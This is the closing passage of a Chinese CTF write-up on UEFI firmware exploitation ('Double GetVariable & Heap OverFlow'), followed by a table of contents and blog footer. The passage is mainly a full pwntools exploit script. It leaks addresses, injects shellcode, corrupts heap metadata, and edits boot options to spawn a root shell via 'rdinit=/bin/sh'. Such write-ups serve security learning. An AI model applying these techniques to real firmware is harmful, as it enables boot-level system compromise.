drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x173f5</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Visitor): &quot;</span>, <span class="string">b&quot;1\r&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Username: &quot;</span>, <span class="string">b&quot;Admin\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jmp WIN;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">WIN:</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;uiapp_base + <span class="number">0xb982</span>&#125;</span>;</span></span><br><span class="line"><span class="string">    jmp rax;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Pass key: &quot;</span>, shellcode+<span class="string">b&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">7</span> + p8(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">7</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + p32(<span class="number">0x30646870</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">ret = stack - <span class="number">0x104ba</span></span><br><span class="line">shellcode = ret - <span class="number">0x49</span></span><br><span class="line">lg(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x78</span> + p32(ret)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x70</span> + p32(shellcode) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x68</span> + p32(<span class="number">0x30726670</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">enterOS()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Press any key to continue...&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/283073">从一道题入门 UEFI PWN</a><br><a target="_blank" rel="noopener" href="https://github.com/yikesoftware/d3ctf-2022-pwn-d3guard">d3ctf-2022-pwn-d3guard</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-GetVariable"><span class="toc-number">2.</span> <span class="toc-text">Double GetVariable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E4%BA%86%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%9A%84IDA%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">恢复了部分符号的IDA伪代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Run"><span class="toc-number">2.2.1.</span> <span class="toc-text">Run</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln"><span class="toc-number">2.2.2.</span> <span class="toc-text">vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Add"><span class="toc-number">2.2.3.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Delete"><span class="toc-number">2.2.4.</span> <span class="toc-text">Delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Get"><span class="toc-number">2.2.5.</span> <span class="toc-text">Get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Encode"><span class="toc-number">2.2.6.</span> <span class="toc-text">Encode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E4%B8%AD%E6%B7%BB%E5%8A%A0%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.3.</span> <span class="toc-text">IDA中添加的结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RuntimeService"><span class="toc-number">2.3.1.</span> <span class="toc-text">RuntimeService</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BootServices"><span class="toc-number">2.3.2.</span> <span class="toc-text">BootServices</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL"><span class="toc-number">2.3.3.</span> <span class="toc-text">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFI-SIMPLE-TEXT-INPUT-PROTOCOL"><span class="toc-number">2.3.4.</span> <span class="toc-text">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemTable"><span class="toc-number">2.3.5.</span> <span class="toc-text">SystemTable</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%9A%84%E5%8A%AB%E6%8C%81"><span class="toc-number">2.6.</span> <span class="toc-text">执行流的劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.7.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-sh"><span class="toc-number">2.7.1.</span> <span class="toc-text">exp.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-py"><span class="toc-number">2.7.2.</span> <span class="toc-text">exp.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap-OverFlow"><span class="toc-number">3.</span> <span class="toc-text">Heap OverFlow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%9A%84%E7%AE%A1%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">堆块的管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E4%BA%86%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%9A%84IDA%E4%BC%AA%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.3.</span> <span class="toc-text">恢复了部分符号的IDA伪代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn"><span class="toc-number">3.3.1.</span> <span class="toc-text">pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Visitor"><span class="toc-number">3.3.2.</span> <span class="toc-text">Visitor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Add-1"><span class="toc-number">3.3.3.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Edit"><span class="toc-number">3.3.4.</span> <span class="toc-text">Edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clearUser"><span class="toc-number">3.3.5.</span> <span class="toc-text">clearUser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SaveInfo"><span class="toc-number">3.3.6.</span> <span class="toc-text">SaveInfo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.5.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-sh-1"><span class="toc-number">3.5.1.</span> <span class="toc-text">exp.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-py-1"><span class="toc-number">3.5.2.</span> <span class="toc-text">exp.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">学习文章</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/01/06/uefi2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/01/06/uefi2/&text=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/01/06/uefi2/&is_video=false&description=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UEFI Double GetVariable &amp; Heap OverFlow&body=Check out this article: https://qanux.github.io/2025/01/06/uefi2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/01/06/uefi2/&name=UEFI Double GetVariable &amp; Heap OverFlow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/01/06/uefi2/&t=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
